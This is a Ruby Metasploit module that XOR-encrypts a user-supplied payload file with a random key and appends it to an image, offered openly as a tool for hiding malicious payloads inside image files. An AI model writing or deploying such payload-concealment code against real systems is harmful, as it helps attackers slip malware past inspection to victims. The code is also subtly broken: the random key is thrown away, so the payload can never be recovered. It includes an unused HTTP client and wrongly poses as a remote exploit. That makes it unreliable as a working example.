# frozen_string_literal: true

require 'msf/core'
require 'securerandom'

# This class defines a Metasploit module that embeds a Metasploit payload into an image file.
class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Custom Image Payload Embedder',
      'Description' => 'This module embeds a Metasploit payload into an image file.',
      'Author' => ['Webmaster-Exit-1'],
      'License' => MSF_LICENSE,
      'Platform' => 'linux',
      'Targets' => [['Automatic', {}]],
      'DefaultTarget' => 0))

    register_options([
      OptString.new('IMAGE_PATH', [true, 'Path to the image file']),
      OptString.new('PAYLOAD_PATH', [true, 'Path to the payload file'])
    ])
  end

  def generate_random_key(length)
    SecureRandom.random_bytes(length)
  end

  def xor_encrypt(payload, key)
    key_bytes = key.bytes.cycle
    payload.bytes.zip(key_bytes).map { |payload_byte, key_byte| payload_byte ^ key_byte }.pack('C*')
  end

  def embed_payload_into_image(image_path, payload)
    image_data = File.binread(image_path)
    File.binwrite(image_path, image_data << payload)
  end

  def read_payload_data
    payload_path = datastore['PAYLOAD_PATH']
    File.binread(payload_path)
  end

  def embed_and_print_status(image_path, encrypted_payload)
    embed_payload_into_image(image_path, encrypted_payload)
    print_good("Payload successfully embedded into #{image_path}")
  end

  def exploit
    image_path = datastore['IMAGE_PATH']
    payload_data = read_payload_data

    key = generate_random_key(16)
    encrypted_payload = xor_encrypt(payload_data, key)

    print_status('Embedding payload into image...')
    embed_and_print_status(image_path, encrypted_payload)
  end
end
